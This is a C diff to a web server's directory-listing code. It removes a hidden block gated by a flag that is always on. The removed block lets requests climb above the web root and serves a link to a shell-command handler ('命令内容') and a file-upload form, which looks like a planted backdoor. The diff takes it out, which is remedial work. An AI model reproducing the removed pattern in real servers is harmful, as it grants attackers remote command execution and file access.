@@ -134,10 +134,12 @@ static int read_dir_list (char * path, char * curpath, frame_p frame)
             if (sizestr_len < len) sizestr_len = len;
  
             filetotal++;
+
         } else if (S_ISDIR(filest.st_mode)) {
             item->isdir = 1;
             if (sizestr_len < 5) sizestr_len = 5;
             dirtotal++;
+
         } else if (S_ISLNK(filest.st_mode)) {
             realpath(tmpstr, realfile);
             if (lstat(realfile, &filest) >= 0) {
@@ -154,6 +156,7 @@ static int read_dir_list (char * path, char * curpath, frame_p frame)
                 }
             }
         }
+
         strncpy(item->name, pent->d_name, sizeof(item->name)-1);
         len = str_len((char *)item->name);
         if (namelen < len) namelen = len;
@@ -249,6 +252,7 @@ static int read_dir_list (char * path, char * curpath, frame_p frame)
                 strcmp(filest.cFileName, "..") == 0)
                 continue;
         }
+
         lstrcpy(svAttribs,"-------");
         if(filest.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)  svAttribs[0] = 'D';
         if(filest.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE)    svAttribs[1] = 'A';
@@ -308,8 +312,6 @@ int DisplayDirectory (void * vmsg)
     char             realpath[512];
     frame_p          frame = NULL;
     char           * pbgn, * pend, * poct;
-    int              ctrlflag = 1;
-    time_t           curt = 0;
     int              dotdot = 0;
     int              i, ret;
  
@@ -323,14 +325,7 @@ int DisplayDirectory (void * vmsg)
 
     root_path = GetRootPath(msg);
     if (!root_path) return -4;
- 
-    time(&curt);
-    if (strcmp(mgmt->inipaddr, msg->srcip) == 0) {
-        if (curt - mgmt->inlaststamp < 3600) {
-            ctrlflag = 1;
-         }
-    }
- 
+
     len = GetRealFile(msg, path, sizeof(path));
     if (file_is_dir(path)) {
  
@@ -396,13 +391,8 @@ int DisplayDirectory (void * vmsg)
     dotdot = url_path_contain_dot_dot(curpath, -1);
     if (dotdot && strncasecmp(realpath, root_path, str_len(root_path)) != 0) {
         //indicate the Browser has requested a parent path upon root.
-        if (ctrlflag) {
-            mgmt->inlaststamp = curt;
-            goto goahead;
-        }
         return -200;
     }
-goahead:
  
     frame = GetFrame(msg);
  
@@ -412,74 +402,32 @@ goahead:
     frame_put_nlast(frame, msg->req_host, msg->req_hostlen);
     frame_appendf(frame, " - %s</title>\n", curpath);
  
-    if (ctrlflag) {
-        frame_append(frame, "<script language=\"javascript\">\n");
-        frame_append(frame, "function check_data() {\n");
-        frame_append(frame, "    with (document.uploadfile) {\n");
-        frame_appendf(frame, "        if (%s.value==\"\") {\n", mgmt->uploadvar);
-        frame_append(frame, "            alert(\"'选择文件'不能为空！\");\n");
-        frame_append(frame, "            return false;\n");
-        frame_append(frame, "        }\n");
-        frame_append(frame, "    }\n");
-        frame_append(frame, "}\n");
-        frame_append(frame, "</script>\n");
-    } // end if (ctrlflag)
- 
     frame_append(frame, "</head>\n<body><H1>");
     frame_put_nlast(frame, msg->req_host, msg->req_hostlen);
     //frame_appendf(frame, " - %s</H1><br>\n", realpath);
     frame_appendf(frame, " - %s</H1><br>\n", curpath);
  
-    if (ctrlflag) {
-        frame_append(frame, "<table width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\">\n");
-        frame_append(frame, "  <tr>\n");
-        frame_append(frame, "    <td align=\"left\" width=\"40%\">\n");
-
-        frame_appendf(frame, "      <p align=\"left\"><strong><a href=\"");
-        frame_put_nlast(frame, msg->docuri->baseuri, msg->docuri->baseurilen);
-        frame_appendf(frame, "%s\" target=\"_blank\">命令内容</a></strong>\n", mgmt->shellcmdso);
- 
-        frame_append(frame, "    </td>\n");
-        frame_append(frame, "    <td align=\"right\" width=\"60%\">\n");
-        frame_append(frame, "    <form method=\"POST\" name=\"uploadfile\" enctype=\"multipart/form-data\"\n");
-
-        frame_appendf(frame, "       action=\"");
-        frame_put_nlast(frame, msg->docuri->baseuri, msg->docuri->baseurilen);
-        frame_appendf(frame, "%s\" \n", mgmt->uploadso);
-
-        frame_append(frame, "         onsubmit=\"javascript:return check_data();\">\n");
-        frame_append(frame, "      <p align=\"right\"><strong>选择文件</strong>\n");
-        frame_appendf(frame, "        <input name=\"%s\" type=file size=36>\n", mgmt->uploadvar);
-        frame_append(frame, "           <input type=submit value=\"上传...\"></p>\n");
-        frame_append(frame, "    </form>\n");
-        frame_append(frame, "    </td>\n");
-        frame_append(frame, "  </tr>\n");
-        frame_append(frame, "</table>\n");
-    } //end if (ctrlflag)
- 
     frame_append(frame, "<hr>\n");
     frame_append(frame, "\n");
     frame_append(frame, "<pre>\n");
  
-    if (ctrlflag) {
-        if (len == 1 && curpath[0] == '/') {
-            frame_append(frame, "[Root Directory]<br><br>\n");
-        } else {
-            pbgn = &curpath[0];
-            pend = &curpath[len-1];
-            pend = rskipOver(pend, pend-pbgn+1, "/", 1);
-            poct = rskipTo(pend, pend-pbgn+1, "/", 1);
+    if (len == 1 && curpath[0] == '/') {
+        frame_append(frame, "[Root Directory]<br><br>\n");
+    } else {
+        pbgn = &curpath[0];
+        pend = &curpath[len-1];
+        pend = rskipOver(pend, pend-pbgn+1, "/", 1);
+        poct = rskipTo(pend, pend-pbgn+1, "/", 1);
  
-            frame_append(frame, "<A HREF=\"");
-            if (poct >= pbgn) {
-                //frame_put_nlast(frame, pbgn, poct-pbgn+1);
-                frame_uri_encode(frame, pbgn, poct-pbgn+1, NULL);
-            }
-            frame_append(frame, "\">[To Parent Directory]</A><br><br>\n");
+        frame_append(frame, "<A HREF=\"");
+        if (poct >= pbgn) {
+            //frame_put_nlast(frame, pbgn, poct-pbgn+1);
+            frame_uri_encode(frame, pbgn, poct-pbgn+1, NULL);
         }
+        frame_append(frame, "\">[To Parent Directory]</A><br><br>\n");
+    }
  
-        read_dir_list(path, curpath, frame);
-    } //end if (ctrlflag)
+    read_dir_list(path, curpath, frame);
  
     frame_append(frame, "</pre><hr></body>\n");
     frame_append(frame, "</html>");
